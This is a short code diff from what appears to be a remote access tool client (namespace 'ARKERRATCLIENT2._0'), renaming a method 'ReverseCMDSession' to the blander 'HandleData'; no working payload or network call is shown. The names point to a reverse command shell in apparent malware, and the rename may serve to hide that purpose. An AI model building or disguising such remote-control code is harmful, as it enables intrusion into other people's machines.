@@ -14,7 +14,7 @@ namespace ARKERRATCLIENT2._0
 
         private static object lockObject = new object();
 
-        public static void ReverseCMDSession(string data)
+        public static void HandleData(string data)
         {
             
                 if (!hasStarted)
